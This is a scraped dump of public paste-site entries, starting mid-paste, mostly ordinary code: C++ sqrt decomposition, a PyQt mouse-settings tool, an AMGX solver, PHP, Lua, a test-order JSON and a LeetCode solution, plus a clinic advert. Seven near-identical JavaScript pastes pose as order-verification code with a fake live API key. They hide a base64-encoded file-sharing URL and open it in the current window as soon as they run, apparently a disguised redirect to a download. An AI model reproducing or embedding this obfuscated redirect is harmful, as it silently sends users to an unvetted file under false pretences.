void update(int l, int r, ll x) {
    int bl = l / k, br = r / k;
    if (bl != br) {
        push(bl);
        push(br);
        
        for (int i = l; i < (bl + 1) * k; i++) {
            b[bl] -= a[i];
            a[i] = x;
            b[bl] += a[i];
        }
        for (int i = br * k; i <= r; ++i) {
            b[br] -= a[i];
            a[i] = x;
            b[br] += a[i];
        }
        for (int i = bl + 1; i < br; ++i) {
            b[i] = k * x;
            add[i] = x;
        }
    } else {
        push(bl);
        
        for (int i = l; i <= r; ++i) {
            b[i / k] -= a[i];
            a[i] = x;
            b[i / k] += a[i];
        }
    }
}

ll sum(int l, int r) {
    int bl = l / k, br = r / k;
    
    ll res = 0;
    
    if (bl != br) {
        push(bl);
        push(br);
        
        for (int i = l; i < (bl + 1) * k; ++i) {
            res += a[i];
        }
        for (int i = br * k; i <= r; ++i) {
            res += a[i];
        }
        for (int i = bl + 1; i < br; ++i) {
            res += b[i];
        }
    } else {
        push(bl);
        
        for (int i = l; i <= r; ++i) {
            res += a[i];
        }    
    }
    
    return res;
}

int main() {
    freopen(""sum.in"", ""r"", stdin);
    freopen(""sum.out"", ""w"", stdout);
    cin >> n >> q;
    a.resize(n);
    k = int(sqrt(n) + 0.99);
    b.resize(k + 1, 0);
    add.resize(k + 1, -1);
    
    while (q--) {
        char op;
        int l, r;
        cin >> op >> l >> r;
        l--; r--;
        if (op == 'A') {
            int x;
            cin >> x;
            update(l, r, x);
        } else {
            cout << sum(l, r) << endl;
        }
    }
    
    return 0;
}


"
XS6XqqKL,Настройка чувствительности мыши rival 3,egor230,Python,Monday 7th of April 2025 02:03:58 AM CDT,"import sys, subprocess
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QComboBox, QSlider, QLabel
from PyQt5.QtCore import Qt

class MouseController(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()  # Инициализация интерфейса при создании объекта

    def initUI(self):
        """"""Настройка графического интерфейса""""""
        self.setWindowTitle('Mouse Controller')  # Установка заголовка окна
        layout = QVBoxLayout()  # Создание вертикального layout для элементов

        # Выпадающий список для выбора цвета
        self.color_label = QLabel('Select Color:')  # Метка для выпадающего списка
        self.color_combo = QComboBox()  # Создание выпадающего списка
        self.color_combo.addItems([""black"", ""red"", ""green"", ""blue"", ""yellow"", ""white""])  # Добавление цветов
        self.color_combo.currentIndexChanged.connect(self.on_color_change)  # Подключение функции при изменении выбора

        # Горизонтальный ползунок для чувствительности
        self.sensitivity_label = QLabel('Sensitivity: 800')  # Метка с текущим значением чувствительности
        self.sensitivity_slider = QSlider(Qt.Horizontal)  # Создание горизонтального ползунка
        self.sensitivity_slider.setMinimum(500)  # Минимальное значение ползунка
        self.sensitivity_slider.setMaximum(1500)  # Максимальное значение ползунка
        self.sensitivity_slider.setValue(800)  # Начальное значение ползунка
        self.sensitivity_slider.valueChanged.connect(self.on_sensitivity_change)  # Подключение функции при изменении значения

        # Добавление элементов в layout
        layout.addWidget(self.color_label)
        layout.addWidget(self.color_combo)
        layout.addWidget(self.sensitivity_label)
        layout.addWidget(self.sensitivity_slider)

        self.setLayout(layout)  # Установка layout для окна
        self.setGeometry(300, 300, 300, 150)  # Установка размеров и положения окна
        self.show()  # Отображение окна

    def on_color_change(self):
        """"""Обработка изменения выбранного цвета""""""
        color = self.color_combo.currentText()  # Получение выбранного цвета
        self.set_mouse_color(color)  # Установка цвета подсветки мыши

    def set_mouse_color(self, color: str):
        """"""Установка цвета подсветки мыши с помощью rivalcfg""""""
        try:
            subprocess.run([""rivalcfg"", ""--strip-top-color"", color], check=True)
            subprocess.run([""rivalcfg"", ""--strip-middle-color"",  color], check=True)
            subprocess.run([""rivalcfg"", ""--strip-bottom-color"",  color], check=True)
            subprocess.run([""rivalcfg"", ""--logo-color"", color], check=True)
            print(f""Цвет подсветки мыши установлен на {color}"")  # Вывод сообщения об успехе
        except subprocess.CalledProcessError as e:
            print(f""Ошибка при установке цвета: {e}"")  # Обработка ошибки выполнения команды

    def on_sensitivity_change(self):
        """"""Обработка изменения значения чувствительности""""""
        value = self.sensitivity_slider.value()  # Получение текущего значения ползунка
        self.sensitivity_label.setText(f'Sensitivity: {value}')  # Обновление метки
        try:
            subprocess.run(['rivalcfg', '--sensitivity', str(value)], check=True)  # Установка чувствительности
            print(f""Чувствительность мыши установлена на {value}"")  # Вывод сообщения об успехе
        except subprocess.CalledProcessError as e:
            print(f""Ошибка при установке чувствительности: {e}"")  # Обработка ошибки выполнения команды

if __name__ == '__main__':
    app = QApplication(sys.argv)  # Создание приложения
    ex = MouseController()  # Создание экземпляра интерфейса
    sys.exit(app.exec_())  # Запуск основного цикла приложения"
KJnRpUVD,Market.js,jm33,JavaScript,Monday 7th of April 2025 02:02:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20419/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
d679uEDz,SQRT Decomposotion,yeskendir_sultanov,C++,Monday 7th of April 2025 01:57:38 AM CDT,"#include <bits/stdc++.h>
using namespace std;

int n, k;
vector<int> a, b, add;

void update(int l, int r, int x) {
    int bl = l / k, br = r / k;
    if (bl != br) {
        for (int i = l; i < (bl + 1) * k; i++) {
            a[i] += x;
            b[bl] += x;
        }
        for (int i = br * k; i <= r; ++i) {
            a[i] += x;
            b[br] += x;
        }
        for (int i = bl + 1; i < br; ++i) {
            b[i] += k * x;
            add[i] += x;
        }
    } else {
        for (int i = l; i <= r; ++i) {
            a[i] += x;
            b[i / k] += x;
        }
    }
}

int sum(int l, int r) {
    int bl = l / k, br = r / k;
    
    int res = 0;
    
    if (bl != br) {
        for (int i = l; i < (bl + 1) * k; ++i) {
            res += a[i] + add[i / k];
        }
        for (int i = br * k; i <= r; ++i) {
            res += a[i] + add[i / k];
        }
        for (int i = bl + 1; i < br; ++i) {
            res += b[i];
        }
    } else {
        for (int i = l; i <= r; ++i) {
            res += a[i] + add[i / k];
        }    
    }
    
    return res;
}

int main() {
    cin >> n;
    a.resize(n);
    k = int(sqrt(n) + 0.99);
    b.resize(k + 1, 0);
    add.resize(k + 1, 0);
    
    for (int i = 0; i < n; ++i) {
        cin >> a[i];
        b[i / k] += a[i];
    }
    
    
    int q;
    cin >> q;
    
    while (q--) {
        int op, l, r;
        cin >> op >> l >> r;
        l--; r--;
        if (op == 1) {
            int x;
            cin >> x;
            update(l, r, x);
        } else {
            cout << sum(l, r) << endl;
        }
    }
    
    return 0;
}


"
pHbRUq69,amgx_ilu_solver.cpp,jomega_ai,C++,Monday 7th of April 2025 01:57:17 AM CDT,"#include <iostream>
#include <fstream>
#include <vector>
#include <amgx_c.h>
#include ""mmio.h""

void read_matrix_market_A(const char* filename, std::vector<int>& row, std::vector<int>& col, std::vector<double>& val,
                          int &n, int &nnz) {
    FILE* f = fopen(filename, ""r"");
    MM_typecode matcode;
    mm_read_banner(f, &matcode);
    int m, k;
    mm_read_mtx_crd_size(f, &m, &k, &nnz);
    n = m;
    row.resize(nnz);
    col.resize(nnz);
    val.resize(nnz);
    for (int i = 0; i < nnz; ++i) {
        int r, c;
        double v;
        fscanf(f, ""%d %d %lf"", &r, &c, &v);
        row[i] = r - 1;
        col[i] = c - 1;
        val[i] = v;
    }
    fclose(f);
}

void read_vector_b(const char* filename, std::vector<double>& b, int &n) {
    FILE* f = fopen(filename, ""r"");
    MM_typecode matcode;
    mm_read_banner(f, &matcode);
    int m, cols;
    fscanf(f, ""%d %d"", &m, &cols);
    n = m;
    b.resize(n);
    for (int i = 0; i < n; ++i) {
        fscanf(f, ""%lf"", &b[i]);
    }
    fclose(f);
}

int main() {
    AMGX_config_handle cfg;
    AMGX_resources_handle rsrc;
    AMGX_matrix_handle A;
    AMGX_vector_handle x, b;

    // Init
    AMGX_initialize();
    AMGX_config_create_from_file(&cfg, ""solver_config.json"");
    AMGX_resources_create_simple(&rsrc, cfg);

    // Read matrix
    std::vector<int> row, col;
    std::vector<double> val;
    int n, nnz;
    read_matrix_market_A(""A.mtx"", row, col, val, n, nnz);

    // Read RHS
    std::vector<double> b_vec;
    int rhs_len;
    read_vector_b(""b.mtx"", b_vec, rhs_len);

    // Create matrix and vectors
    AMGX_vector_create(&x, rsrc, AMGX_mode_dDDI);
    AMGX_vector_create(&b, rsrc, AMGX_mode_dDDI);
    AMGX_matrix_create(&A, rsrc, AMGX_mode_dDDI);

    // Upload system
    AMGX_matrix_upload_all(A, n, nnz, 1, 1, row.data(), col.data(), val.data(), NULL);

    AMGX_vector_upload(b, n, 1, b_vec.data());
    std::vector<double> x_vec(n, 0.0);
    AMGX_vector_upload(x, n, 1, x_vec.data());

    // Create solver and solve
    AMGX_solver_handle solver;
    AMGX_solver_create(&solver, rsrc, AMGX_mode_dDDI, cfg);
    AMGX_solver_setup(solver, A);
    AMGX_solver_solve(solver, b, x);
    AMGX_SOLVE_STATUS status;
    AMGX_solver_get_status(solver, &status);

    if (status != AMGX_SOLVE_SUCCESS)
    {
        std::cerr << ""❌ AMGX solve failed. Status code: "" << status << std::endl;
    }
    else
    {
        std::cout << ""✅ AMGX solve succeeded."" << std::endl;
    }

    // Download solution
    AMGX_vector_download(x, x_vec.data());

    std::ofstream out(""solution.mtx"");
    out << ""%%MatrixMarket matrix array real general\n"";
    out << n << "" 1\n"";
    for (int i = 0; i < n; ++i)
        out << x_vec[i] << ""\n"";
    out.close();

    std::cout << ""Solved Ax = b and the solution written to solution.mtx\n"";

    // Cleanup
    AMGX_solver_destroy(solver);
    AMGX_vector_destroy(x);
    AMGX_vector_destroy(b);
    AMGX_matrix_destroy(A);
    AMGX_resources_destroy(rsrc);
    AMGX_config_destroy(cfg);
    AMGX_finalize();
    return 0;
}
"
uFRvhH0L,override post excerpt length with substr,arie_cristianD,PHP,Monday 7th of April 2025 01:49:00 AM CDT,"add_filter( 'jnews_module_excerpt', 'override_jnews_module_excerpt', 99, 4 );

function override_jnews_module_excerpt( $excerpt, $post_id, $excerpt_length, $excerpt_more ) {

	$excerpt  = mb_substr( $excerpt, 0, 100, 'UTF-8' ); /* You can replace the value 100 with the number of characters you want to display in the post excerpt. */
	$excerpt .= ' ' . $excerpt_more;

	return $excerpt;
}
"
gH0KRZZE,Untitled,jm33,JavaScript,Monday 7th of April 2025 01:47:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46021/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Em2sZPSF,Filter,Blackhome,Lua,Monday 7th of April 2025 01:36:47 AM CDT,"

local function transportFirstType()
    local chestFront = peripheral.wrap(""front"")
    local chestBack = peripheral.wrap(""back"")

    local firstItemName = """"

    local cnt = 1
    while cnt <= 54 do
        local item = chestFront.getItemDetail(cnt)
        if item then
            firstItemName = item.name
            break
        end
        cnt = cnt + 1
    end
    if string.len(firstItemName) > 0 then
        local cnt = 1
        local cnt2 = 0
        
        while cnt <= 54 do
            local item = chestFront.getItemDetail(cnt)
            if item then
                if firstItemName == item.name then
                    chestBack.pullItems(""front"", cnt)
                    cnt2 = cnt2 + 1
                end
                if cnt2 >= 16 then
                    break
                end
            end
            cnt = cnt + 1
        end
    end
end

local function chestEmpty(chest)
    for slot, item in pairs(chest.list()) do
        return false
    end
    return true
end

while true do
    if chestEmpty(peripheral.wrap(""back"")) then
        transportFirstType()
    else
        print(""chest is not empty"") 
    end
end"
yQWtkhtf,Products.js,jm33,JavaScript,Monday 7th of April 2025 01:32:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70502/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
urCsTQRg,Order.js,jm33,JavaScript,Monday 7th of April 2025 01:16:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/90243/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RHKRBxcZ,Market.js,jm33,JavaScript,Monday 7th of April 2025 01:01:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02401/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
rx5EHZQe,Untitled,jm33,JavaScript,Monday 7th of April 2025 12:46:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31687/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X8zeNyQs,Trusted Vein Doctors at USA Vein Clinics in the Bronx,usveinclinics,HTML,Monday 7th of April 2025 12:37:51 AM CDT,"USA Vein Clinics in the Bronx offers advanced, minimally invasive treatments for varicose and spider veins. Our experienced vein specialists provide procedures like Endovenous Laser Treatment (EVLT), Radiofrequency Ablation (RFA), and Sclerotherapy to alleviate symptoms such as leg pain, swelling, and fatigue. With multiple convenient locations throughout the Bronx, accessing top-quality vein care is straightforward. Schedule your consultation today to achieve healthier, more comfortable legs with our dedicated vein doctors in the Bronx. 
https://www.usaveinclinics.com/company/locations/new-york/bronx/"
dVVDS0Fs,Products.js,jm33,JavaScript,Monday 7th of April 2025 12:30:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/10826/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1VD2AejG,ZOMATO TEST ORDER,bagsari,JSON,Monday 7th of April 2025 12:24:05 AM CDT,"{

  ""components"": [
    {
      ""inventory_id"": 185769,
      ""is_delivery"": true,
      ""quantity"": 1,
      ""unit_id"": 48
    }
  ],
  ""user"": {
    ""email"": ""raj@example.com""

  },
  ""payment_mode"": ""Cash"",
  ""currency"": ""INR"",
  ""added_on"": ""2025-04-07T05:19:15.453Z"",
  ""info"": {""source"": ""ZOMATO""},
  ""is_paid"": false,
  ""update"": false,
  ""source_order_id"": ""ZOMATO-12345"",
  ""status"": ""Created""
}"
BaPKGT94,Untitled,smj007,Python,Monday 7th of April 2025 12:15:46 AM CDT,"# same tc and sc for both - however - 

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        max_profit = 0
        recent_valley = prices[0]
        recent_peak = prices[0]
        i = 0

        while i < len(prices)-1:
            #find valley first
            while i < len(prices)-1 and prices[i+1]<=prices[i]:
                i += 1
            recent_valley = prices[i]
           
            # find peak then
            while i < len(prices)-1 and prices[i+1]>=prices[i]:
                i += 1
            recent_peak = prices[i]

            # calculate profit
            max_profit += recent_peak - recent_valley

        return max_profit


class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        max_profit = 0

        for i in range(1, len(prices)):
            if prices[i] > prices[i-1]:
                max_profit += prices[i] - prices[i-1]

        return max_profit
        "
